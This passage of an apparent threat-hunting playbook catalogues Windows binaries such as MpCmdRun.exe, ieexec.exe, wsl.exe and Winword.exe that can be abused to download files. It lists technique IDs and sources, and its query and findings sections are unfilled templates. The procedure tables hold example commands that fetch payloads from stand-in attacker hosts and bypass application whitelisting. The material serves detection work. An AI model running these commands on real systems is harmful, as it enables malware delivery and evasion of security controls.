ository\k127793.inf_amd64_3ab7883eddccbf0f\`</li><li>`c:\windows\system32\driverstore\filerepository\ki129523.inf_amd64_32947eecf8f3e231\`</li><li>`c:\windows\system32\driverstore\filerepository\ki126950.inf_amd64_fa7f56314967630d\`</li><li>`c:\windows\system32\driverstore\filerepository\ki126951.inf_amd64_94804e3918169543\`</li><li>`c:\windows\system32\driverstore\filerepository\ki126973.inf_amd64_06dde156632145e3\`</li><li>`c:\windows\system32\driverstore\filerepository\ki126974.inf_amd64_9168fc04b8275db9\`</li><li>`c:\windows\system32\driverstore\filerepository\ki127005.inf_amd64_753576c4406c1193\`</li><li>`c:\windows\system32\driverstore\filerepository\ki127018.inf_amd64_0f67ff47e9e30716\`</li><li>`c:\windows\system32\driverstore\filerepository\ki127021.inf_amd64_0d68af55c12c7c17\`</li><li>`c:\windows\system32\driverstore\filerepository\ki127171.inf_amd64_368f8c7337214025\`</li><li>`c:\windows\system32\driverstore\filerepository\ki127176.inf_amd64_86c658cabfb17c9c\`</li><li>`c:\windows\system32\driverstore\filerepository\ki127390.inf_amd64_e1ccb879ece8f084\`</li><li>`c:\windows\system32\driverstore\filerepository\ki127678.inf_amd64_8427d3a09f47dfc1\`</li><li>`c:\windows\system32\driverstore\filerepository\ki127727.inf_amd64_cf8e31692f82192e\`</li><li>`c:\windows\system32\driverstore\filerepository\ki127807.inf_amd64_fc915899816dbc5d\`</li><li>`c:\windows\system32\driverstore\filerepository\ki127850.inf_amd64_6ad8d99023b59fd5\`</li><li>`c:\windows\system32\driverstore\filerepository\ki128602.inf_amd64_6ff790822fd674ab\`</li><li>`c:\windows\system32\driverstore\filerepository\ki128916.inf_amd64_3509e1eb83b83cfb\`</li><li>`c:\windows\system32\driverstore\filerepository\ki129407.inf_amd64_f26f36ac54ce3076\`</li><li>`c:\windows\system32\driverstore\filerepository\ki129633.inf_amd64_d9b8af875f664a8c\`</li><li>`c:\windows\system32\driverstore\filerepository\ki129866.inf_amd64_e7cdca9882c16f55\`</li><li>`c:\windows\system32\driverstore\filerepository\ki130274.inf_amd64_bafd2440fa1ffdd6\`</li><li>`c:\windows\system32\driverstore\filerepository\ki130350.inf_amd64_696b7c6764071b63\`</li><li>`c:\windows\system32\driverstore\filerepository\ki130409.inf_amd64_0d8d61270dfb4560\`</li><li>`c:\windows\system32\driverstore\filerepository\ki130471.inf_amd64_26ad6921447aa568\`</li><li>`c:\windows\system32\driverstore\filerepository\ki130624.inf_amd64_d85487143eec5e1a\`</li><li>`c:\windows\system32\driverstore\filerepository\ki130825.inf_amd64_ee3ba427c553f15f\`</li><li>`c:\windows\system32\driverstore\filerepository\ki130871.inf_amd64_382f7c369d4bf777\`</li><li>`c:\windows\system32\driverstore\filerepository\ki131064.inf_amd64_5d13f27a9a9843fa\`</li><li>`c:\windows\system32\driverstore\filerepository\ki131176.inf_amd64_fb4fe914575fdd15\`</li><li>`c:\windows\system32\driverstore\filerepository\ki131191.inf_amd64_d668106cb6f2eae0\`</li><li>`c:\windows\system32\driverstore\filerepository\ki131622.inf_amd64_0058d71ace34db73\`</li><li>`c:\windows\system32\driverstore\filerepository\ki132032.inf_amd64_f29660d80998e019\`</li><li>`c:\windows\system32\driverstore\filerepository\ki132337.inf_amd64_223d6831ffa64ab1\`</li><li>`c:\windows\system32\driverstore\filerepository\ki132535.inf_amd64_7875dff189ab2fa2\`</li><li>`c:\windows\system32\driverstore\filerepository\ki132544.inf_amd64_b8c1f31373153db4\`</li><li>`c:\windows\system32\driverstore\filerepository\ki132574.inf_amd64_54c9b905b975ee55\`</li><li>`c:\windows\system32\driverstore\filerepository\ki132869.inf_amd64_052eb72d070df60f\`</li><li>`c:\windows\system32\driverstore\filerepository\kit126731.inf_amd64_1905c9d5f38631d9\`</li></ul></div>|
|**Code Samples**|<div style="text-align: left"><ul></ul></div>|
|**Acknowledgements**|<div style="text-align: left"><ul><li>Jesus Galvez (None)</li></ul></div>|
|**Additional Resources**|<div style="text-align: left"><ul><li>https://www.sothis.tech/author/jgalvez/</li></ul></div>|

 
 

 

#### Procedures

|Category|Example Command|Description|
|--------|---------------|-----------|
|Download|`C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_[0-9]+\GfxDownloadWrapper.exe &#34;URL&#34; &#34;DESTINATION FILE&#34;`|GfxDownloadWrapper.exe downloads the content that returns URL and writes it to the file DESTINATION FILE PATH. The binary is signed by &#34;Microsoft Windows Hardware&#34;, &#34;Compatibility Publisher&#34;, &#34;Microsoft Windows Third Party Component CA 2012&#34;, &#34;Microsoft Time-Stamp PCA 2010&#34;, &#34;Microsoft Time-Stamp Service&#34;.|


 

#### Search Queries


> Analytic Goes Here!


 
## Hh.exe

Binary used for processing chm files in Windows

#### Metadata

|Details||
|-------|---|
|**MITRE ATT&CK Technique IDs**|<div style="text-align: left"><ul><li>T1105</li><li>T1216</li></ul></div>|
|**Categories**|<div style="text-align: left"><ul><li>Download</li><li>Execute</li></ul></div>|
|**Relevant Operating Systems**|<div style="text-align: left"><ul><li>Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li></ul></div>|
|**File Paths**|<div style="text-align: left"><ul><li>`C:\Windows\System32\hh.exe`</li><li>`C:\Windows\SysWOW64\hh.exe`</li></ul></div>|
|**Code Samples**|<div style="text-align: left"><ul><li>None</li></ul></div>|
|**Acknowledgements**|<div style="text-align: left"><ul><li>Oddvar Moe (@oddvarmoe)</li></ul></div>|
|**Additional Resources**|<div style="text-align: left"><ul><li>https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/</li></ul></div>|

 
 

 

#### Procedures

|Category|Example Command|Description|
|--------|---------------|-----------|
|Download|`HH.exe http://some.url/script.ps1`|Open the target PowerShell script with HTML Help.|


 

#### Search Queries


> Analytic Goes Here!


 
## Ieexec.exe

The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.

#### Metadata

|Details||
|-------|---|
|**MITRE ATT&CK Technique IDs**|<div style="text-align: left"><ul><li>T1105</li><li>T1218</li></ul></div>|
|**Categories**|<div style="text-align: left"><ul><li>Download</li><li>Execute</li></ul></div>|
|**Relevant Operating Systems**|<div style="text-align: left"><ul><li>Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li></ul></div>|
|**File Paths**|<div style="text-align: left"><ul><li>`C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe`</li><li>`C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe`</li></ul></div>|
|**Code Samples**|<div style="text-align: left"><ul><li>None</li></ul></div>|
|**Acknowledgements**|<div style="text-align: left"><ul><li>Casey Smith (@subtee)</li></ul></div>|
|**Additional Resources**|<div style="text-align: left"><ul><li>https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/</li></ul></div>|

 
 

 

#### Procedures

|Category|Example Command|Description|
|--------|---------------|-----------|
|Download|`ieexec.exe http://x.x.x.x:8080/bypass.exe`|Downloads and executes bypass.exe from the remote server.|


 

#### Search Queries


> Analytic Goes Here!


 
## Makecab.exe

Binary to package existing files into a cabinet (.cab) file

#### Metadata

|Details||
|-------|---|
|**MITRE ATT&CK Technique IDs**|<div style="text-align: left"><ul><li>T1096</li><li>T1105</li></ul></div>|
|**Categories**|<div style="text-align: left"><ul><li>ADS</li><li>Download</li></ul></div>|
|**Relevant Operating Systems**|<div style="text-align: left"><ul><li>Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li></ul></div>|
|**File Paths**|<div style="text-align: left"><ul><li>`C:\Windows\System32\makecab.exe`</li><li>`C:\Windows\SysWOW64\makecab.exe`</li></ul></div>|
|**Code Samples**|<div style="text-align: left"><ul><li>None</li></ul></div>|
|**Acknowledgements**|<div style="text-align: left"><ul><li>Oddvar Moe (@oddvarmoe)</li></ul></div>|
|**Additional Resources**|<div style="text-align: left"><ul><li>https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f</li></ul></div>|

 

#### Procedures

|Category|Example Command|Description|
|--------|---------------|-----------|
|Download|`makecab \\webdavserver\webdav\file.exe C:\Folder\file.cab`|Download and compresses the target file and stores it in the target file.|


 

#### Search Queries


> Analytic Goes Here!


 
## MpCmdRun.exe

Binary part of Windows Defender. Used to manage settings in Windows Defender

#### Metadata

|Details||
|-------|---|
|**MITRE ATT&CK Technique IDs**|<div style="text-align: left"><ul><li>T1105</li><li>T1096</li></ul></div>|
|**Categories**|<div style="text-align: left"><ul><li>Download</li><li>ADS</li></ul></div>|
|**Relevant Operating Systems**|<div style="text-align: left"><ul><li>Windows 10</li></ul></div>|
|**File Paths**|<div style="text-align: left"><ul><li>`C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.4-0\MpCmdRun.exe`</li><li>`C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.7-0\MpCmdRun.exe`</li><li>`C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe`</li></ul></div>|
|**Code Samples**|<div style="text-align: left"><ul><li>None</li></ul></div>|
|**Acknowledgements**|<div style="text-align: left"><ul><li>Askar (@mohammadaskar2)</li><li>Oddvar Moe (@oddvarmoe)</li><li>RichRumble ()</li><li>Cedric (@th3c3dr1c)</li></ul></div>|
|**Additional Resources**|<div style="text-align: left"><ul><li>https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-antivirus/command-line-arguments-microsoft-defender-antivirus</li><li>https://twitter.com/mohammadaskar2/status/1301263551638761477</li><li>https://twitter.com/Oddvarmoe/status/1301444858910052352</li><li>https://twitter.com/NotMedic/status/1301506813242867720</li></ul></div>|

 

#### Procedures

|Category|Example Command|Description|
|--------|---------------|-----------|
|Download|`MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\temp\\beacon.exe`|Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path)|
|Download|`copy &#34;C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe&#34; C:\Users\Public\Downloads\MP.exe &amp;&amp; chdir &#34;C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\&#34; &amp;&amp; &#34;C:\Users\Public\Downloads\MP.exe&#34; -DownloadFile -url https://attacker.server/beacon.exe -path C:\Users\Public\Downloads\evil.exe`|Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path) [updated version to bypass Windows 10 mitigation]|


 

#### Search Queries


> Analytic Goes Here!


 
## Powerpnt.exe

Microsoft Office binary.

#### Metadata

|Details||
|-------|---|
|**MITRE ATT&CK Technique IDs**|<div style="text-align: left"><ul><li>T1105</li></ul></div>|
|**Categories**|<div style="text-align: left"><ul><li>Download</li></ul></div>|
|**Relevant Operating Systems**|<div style="text-align: left"><ul><li>Windows</li></ul></div>|
|**File Paths**|<div style="text-align: left"><ul><li>`C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\Powerpnt.exe`</li><li>`C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\Powerpnt.exe`</li><li>`C:\Program Files (x86)\Microsoft Office\Office16\Powerpnt.exe`</li><li>`C:\Program Files\Microsoft Office\Office16\Powerpnt.exe`</li><li>`C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\Powerpnt.exe`</li><li>`C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\Powerpnt.exe`</li><li>`C:\Program Files (x86)\Microsoft Office\Office15\Powerpnt.exe`</li><li>`C:\Program Files\Microsoft Office\Office15\Powerpnt.exe`</li><li>`C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\Powerpnt.exe`</li><li>`C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\Powerpnt.exe`</li><li>`C:\Program Files (x86)\Microsoft Office\Office14\Powerpnt.exe`</li><li>`C:\Program Files\Microsoft Office\Office14\Powerpnt.exe`</li><li>`C:\Program Files (x86)\Microsoft Office\Office12\Powerpnt.exe`</li><li>`C:\Program Files\Microsoft Office\Office12\Powerpnt.exe`</li></ul></div>|
|**Code Samples**|<div style="text-align: left"><ul></ul></div>|
|**Acknowledgements**|<div style="text-align: left"><ul><li>Reegun J (OCBC Bank) (@reegun21)</li></ul></div>|
|**Additional Resources**|<div style="text-align: left"><ul><li>https://twitter.com/reegun21/status/1150032506504151040</li><li>https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191</li></ul></div>|

 

#### Procedures

|Category|Example Command|Description|
|--------|---------------|-----------|
|Download|`Powerpnt.exe &#34;http://192.168.1.10/TeamsAddinLoader.dll&#34;`|Downloads payload from remote server|


 

#### Search Queries


> Analytic Goes Here!


 
## Replace.exe

Used to replace file with another file

#### Metadata

|Details||
|-------|---|
|**MITRE ATT&CK Technique IDs**|<div style="text-align: left"><ul><li>T1105</li></ul></div>|
|**Categories**|<div style="text-align: left"><ul><li>Copy</li><li>Download</li></ul></div>|
|**Relevant Operating Systems**|<div style="text-align: left"><ul><li>Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li></ul></div>|
|**File Paths**|<div style="text-align: left"><ul><li>`C:\Windows\System32\replace.exe`</li><li>`C:\Windows\SysWOW64\replace.exe`</li></ul></div>|
|**Code Samples**|<div style="text-align: left"><ul><li>None</li></ul></div>|
|**Acknowledgements**|<div style="text-align: left"><ul><li>elceef (@elceef)</li></ul></div>|
|**Additional Resources**|<div style="text-align: left"><ul><li>https://twitter.com/elceef/status/986334113941655553</li><li>https://twitter.com/elceef/status/986842299861782529</li></ul></div>|

 

#### Procedures

|Category|Example Command|Description|
|--------|---------------|-----------|
|Download|`replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A`|Download/Copy bar.exe to outdir|


 

#### Search Queries


> Analytic Goes Here!


 
## Squirrel.exe

Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.

#### Metadata

|Details||
|-------|---|
|**MITRE ATT&CK Technique IDs**|<div style="text-align: left"><ul><li>T1218</li></ul></div>|
|**Categories**|<div style="text-align: left"><ul><li>Download</li><li>AWL Bypass</li><li>Execute</li></ul></div>|
|**Relevant Operating Systems**|<div style="text-align: left"><ul><li>Windows 7 and up with Microsoft Teams installed</li></ul></div>|
|**File Paths**|<div style="text-align: left"><ul><li>`%localappdata%\Microsoft\Teams\current\Squirrel.exe`</li></ul></div>|
|**Code Samples**|<div style="text-align: left"><ul><li>https://github.com/jreegun/POC-s/tree/master/nuget-squirrel</li></ul></div>|
|**Acknowledgements**|<div style="text-align: left"><ul><li>Reegun J (OCBC Bank) (@reegun21)</li><li>Adam (@Hexacorn)</li></ul></div>|
|**Additional Resources**|<div style="text-align: left"><ul><li>https://www.youtube.com/watch?v=rOP3hnkj7ls</li><li>https://twitter.com/reegun21/status/1144182772623269889</li><li>http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/</li><li>https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12</li><li>https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56</li></ul></div>|

 

#### Procedures

|Category|Example Command|Description|
|--------|---------------|-----------|
|Download|`squirrel.exe --download [url to package]`|The above binary will go to url and look for RELEASES file and download the nuget package.|
|AWL Bypass|`squirrel.exe --update [url to package]`|The above binary will go to url and look for RELEASES file, download and install the nuget package.|
|Execute|`squirrel.exe --updateRollback=[url to package]`|The above binary will go to url and look for RELEASES file, download and install the nuget package.|

 

#### Search Queries


> Analytic Goes Here!


 
## Update.exe

Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.

#### Metadata

|Details||
|-------|---|
|**MITRE ATT&CK Technique IDs**|<div style="text-align: left"><ul><li>T1218</li><li>T1547</li><li>T1070</li></ul></div>|
|**Categories**|<div style="text-align: left"><ul><li>Download</li><li>AWL Bypass</li><li>Execute</li></ul></div>|
|**Relevant Operating Systems**|<div style="text-align: left"><ul><li>Windows 7 and up with Microsoft Teams installed</li></ul></div>|
|**File Paths**|<div style="text-align: left"><ul><li>`%localappdata%\Microsoft\Teams\update.exe`</li></ul></div>|
|**Code Samples**|<div style="text-align: left"><ul><li>https://github.com/jreegun/POC-s/tree/master/nuget-squirrel</li></ul></div>|
|**Acknowledgements**|<div style="text-align: left"><ul><li>Reegun Richard Jayapaul (SpiderLabs, Trustwave) (@reegun21)</li><li>Mr.Un1k0d3r (@MrUn1k0d3r)</li><li>Adam (@Hexacorn)</li><li>Jesus Galvez (None)</li></ul></div>|
|**Additional Resources**|<div style="text-align: left"><ul><li>https://www.youtube.com/watch?v=rOP3hnkj7ls</li><li>https://twitter.com/reegun21/status/1144182772623269889</li><li>https://twitter.com/MrUn1k0d3r/status/1143928885211537408</li><li>https://twitter.com/reegun21/status/1291005287034281990</li><li>http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/</li><li>https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12</li><li>https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56</li><li>https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/</li></ul></div>|

 

#### Procedures

|Category|Example Command|Description|
|--------|---------------|-----------|
|Download|`Update.exe --download [url to package]`|The above binary will go to url and look for RELEASES file and download the nuget package.|
|AWL Bypass|`Update.exe --update=[url to package]`|The above binary will go to url and look for RELEASES file, download and install the nuget package.|
|AWL Bypass|`Update.exe --update=\\remoteserver\payloadFolder`|The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.|


 

#### Search Queries


> Analytic Goes Here!


 
## Winword.exe

Microsoft Office binary

#### Metadata

|Details||
|-------|---|
|**MITRE ATT&CK Technique IDs**|<div style="text-align: left"><ul><li>T1105</li></ul></div>|
|**Categories**|<div style="text-align: left"><ul><li>Download</li></ul></div>|
|**Relevant Operating Systems**|<div style="text-align: left"><ul><li>Windows</li></ul></div>|
|**File Paths**|<div style="text-align: left"><ul><li>`C:\Program Files\Microsoft Office\root\Office16\winword.exe`</li><li>`C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\winword.exe`</li><li>`C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\winword.exe`</li><li>`C:\Program Files (x86)\Microsoft Office\Office16\winword.exe`</li><li>`C:\Program Files\Microsoft Office\Office16\winword.exe`</li><li>`C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\winword.exe`</li><li>`C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\winword.exe`</li><li>`C:\Program Files (x86)\Microsoft Office\Office15\winword.exe`</li><li>`C:\Program Files\Microsoft Office\Office15\winword.exe`</li><li>`C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\winword.exe`</li><li>`C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\winword.exe`</li><li>`C:\Program Files (x86)\Microsoft Office\Office14\winword.exe`</li><li>`C:\Program Files\Microsoft Office\Office14\winword.exe`</li><li>`C:\Program Files (x86)\Microsoft Office\Office12\winword.exe`</li><li>`C:\Program Files\Microsoft Office\Office12\winword.exe`</li></ul></div>|
|**Code Samples**|<div style="text-align: left"><ul><li>None</li></ul></div>|
|**Acknowledgements**|<div style="text-align: left"><ul><li>Reegun J (OCBC Bank) (@reegun21)</li></ul></div>|
|**Additional Resources**|<div style="text-align: left"><ul><li>https://twitter.com/reegun21/status/1150032506504151040</li><li>https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191</li></ul></div>|

 

#### Procedures

|Category|Example Command|Description|
|--------|---------------|-----------|
|Download|`winword.exe &#34;http://192.168.1.10/TeamsAddinLoader.dll&#34;`|Downloads payload from remote server|


 

#### Search Queries


> Analytic Goes Here!


 
## Wsl.exe

Windows subsystem for Linux executable

#### Metadata

|Details||
|-------|---|
|**MITRE ATT&CK Technique IDs**|<div style="text-align: left"><ul><li>T1202</li></ul></div>|
|**Categories**|<div style="text-align: left"><ul><li>Execute</li><li>Download</li></ul></div>|
|**Relevant Operating Systems**|<div style="text-align: left"><ul><li>Windows 10, Windows 19 Server</li></ul></div>|
|**File Paths**|<div style="text-align: left"><ul><li>`C:\Windows\System32\wsl.exe`</li></ul></div>|
|**Code Samples**|<div style="text-align: left"><ul><li>None</li></ul></div>|
|**Acknowledgements**|<div style="text-align: left"><ul><li>Alex Ionescu (@aionescu)</li><li>Matt (@NotoriousRebel1)</li><li>Asif Matadar (@d1r4c)</li></ul></div>|
|**Additional Resources**|<div style="text-align: left"><ul><li>https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules</li></ul></div>|

 
 
#### Procedures

|Category|Example Command|Description|
|--------|---------------|-----------|
|Download|`wsl.exe --exec bash -c &#39;cat &lt; /dev/tcp/192.168.1.10/54 &gt; binary&#39;`|Downloads file from 192.168.1.10|


 

#### Search Queries


> Analytic Goes Here!


 
## Xwizard.exe

#### Metadata

|Details||
|-------|---|
|**MITRE ATT&CK Technique IDs**|<div style="text-align: left"><ul><li>T1218</li><li>T1105</li></ul></div>|
|**Categories**|<div style="text-align: left"><ul><li>Execute</li><li>Download</li></ul></div>|
|**Relevant Operating Systems**|<div style="text-align: left"><ul><li>Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li><li>Windows 10</li></ul></div>|
|**File Paths**|<div style="text-align: left"><ul><li>`C:\Windows\System32\xwizard.exe`</li><li>`C:\Windows\SysWOW64\xwizard.exe`</li></ul></div>|
|**Code Samples**|<div style="text-align: left"><ul><li>None</li></ul></div>|
|**Acknowledgements**|<div style="text-align: left"><ul><li>Adam (@Hexacorn)</li><li>Nick Tyrer (@NickTyrer)</li><li>harr0ey (@harr0ey)</li><li>Wade Hickey (@notwhickey)</li></ul></div>|
|**Additional Resources**|<div style="text-align: left"><ul><li>http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/</li><li>https://www.youtube.com/watch?v=LwDHX7DVHWU</li><li>https://gist.github.com/NickTyrer/0598b60112eaafe6d07789f7964290d5</li><li>https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/</li><li>https://twitter.com/notwhickey/status/1306023056847110144</li></ul></div>|

 

#### Procedures

|Category|Example Command|Description|
|--------|---------------|-----------|
|Download|`xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://pastebin.com/raw/iLxUT5gM`|Xwizard.exe uses RemoteApp and Desktop Connections wizard to download a file.|


 

#### Search Queries


> Analytic Goes Here!


 

## Findings

This section details some of the expected outcomes from running this playbook.


> Were any "living off the land binaries" used as downloaders in the data set? 

 
Please fill out with your findings.
 


> Can we validate whether or not the downloaded file(s) are for legitimate business purposes? If so, document those examples.

 
Please fill out with your findings.
 


> Can we validate whether or not the downloaded file(s) are for legitimate business purposes?

 
Please fill out with your findings.
 

 

## References

|Binary|Resource|
|------|--------|
|`AppInstaller.exe`|<div style="text-align: left"><ul><li>https://twitter.com/notwhickey/status/1333900137232523264</li></ul></div>|
|`Bitsadmin.exe`|<div style="text-align: left"><ul><li>https://www.slideshare.net/chrisgates/windows-attacks-at-is-the-new-black-26672679 - slide 53</li><li>https://www.youtube.com/watch?v=_8xJaaQlpBo</li><li>https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f</li></ul></div>|
|`CertReq.exe`|<div style="text-align: left"><ul><li>https://dtm.uk/certreq</li></ul></div>|
|`Desktopimgdownldr.exe`|<div style="text-align: left"><ul><li>https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/</li></ul></div>|
|`Diantz.exe`|<div style="text-align: left"><ul><li>https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diantz</li></ul></div>|
|`Esentutl.exe`|<div style="text-align: left"><ul><li>https://twitter.com/egre55/status/985994639202283520</li><li>https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/</li><li>https://twitter.com/bohops/status/1094810861095534592</li></ul></div>|
|`Excel.exe`|<div style="text-align: left"><ul><li>https://twitter.com/reegun21/status/1150032506504151040</li><li>https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191</li></ul></div>|
|`Expand.exe`|<div style="text-align: left"><ul><li>https://twitter.com/infosecn1nja/status/986628482858807297</li><li>https://twitter.com/Oddvarmoe/status/986709068759949319</li></ul></div>|
|`Extrac32.exe`|<div style="text-align: left"><ul><li>https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/</li><li>https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f</li><li>https://twitter.com/egre55/status/985994639202283520</li></ul></div>|
|`Findstr.exe`|<div style="text-align: left"><ul><li>https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/</li><li>https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f</li></ul></div>|
|`Ftp.exe`|<div style="text-align: left"><ul><li>https://twitter.com/0xAmit/status/1070063130636640256</li><li>https://medium.com/@0xamit/lets-talk-about-security-research-discoveries-and-proper-discussion-etiquette-on-twitter-10f9be6d1939</li><li>https://ss64.com/nt/ftp.html</li><li>https://www.asafety.fr/vuln-exploit-poc/windows-dos-powershell-upload-de-fichier-en-ligne-de-commande-one-liner/</li></ul></div>|
|`GfxDownloadWrapper.exe`|<div style="text-align: left"><ul><li>https://www.sothis.tech/author/jgalvez/</li></ul></div>|
|`Hh.exe`|<div style="text-align: left"><ul><li>https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/</li></ul></div>|
|`Ieexec.exe`|<div style="text-align: left"><ul><li>https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/</li></ul></div>|
|`Makecab.exe`|<div style="text-align: left"><ul><li>https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f</li></ul></div>|
|`MpCmdRun.exe`|<div style="text-align: left"><ul><li>https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-antivirus/command-line-arguments-microsoft-defender-antivirus</li><li>https://twitter.com/mohammadaskar2/status/1301263551638761477</li><li>https://twitter.com/Oddvarmoe/status/1301444858910052352</li><li>https://twitter.com/NotMedic/status/1301506813242867720</li></ul></div>|
|`Powerpnt.exe`|<div style="text-align: left"><ul><li>https://twitter.com/reegun21/status/1150032506504151040</li><li>https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191</li></ul></div>|
|`Replace.exe`|<div style="text-align: left"><ul><li>https://twitter.com/elceef/status/986334113941655553</li><li>https://twitter.com/elceef/status/986842299861782529</li></ul></div>|
|`Squirrel.exe`|<div style="text-align: left"><ul><li>https://www.youtube.com/watch?v=rOP3hnkj7ls</li><li>https://twitter.com/reegun21/status/1144182772623269889</li><li>http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/</li><li>https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12</li><li>https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56</li></ul></div>|
|`Update.exe`|<div style="text-align: left"><ul><li>https://www.youtube.com/watch?v=rOP3hnkj7ls</li><li>https://twitter.com/reegun21/status/1144182772623269889</li><li>https://twitter.com/MrUn1k0d3r/status/1143928885211537408</li><li>https://twitter.com/reegun21/status/1291005287034281990</li><li>http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/</li><li>https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12</li><li>https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56</li><li>https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/</li></ul></div>|
|`Winword.exe`|<div style="text-align: left"><ul><li>https://twitter.com/reegun21/status/1150032506504151040</li><li>https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191</li></ul></div>|
|`Wsl.exe`|<div style="text-align: left"><ul><li>https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules</li></ul></div>|
|`Xwizard.exe`|<div style="text-align: left"><ul><li>http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/</li><li>https://www.youtube.com/watch?v=LwDHX7DVHWU</li><li>https://gist.github.com/NickTyrer/0598b60112eaafe6d07789f7964290d5</li><li>https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/</li><li>https://twitter.com/notwhickey/status/1306023056847110144</li></ul></div>|

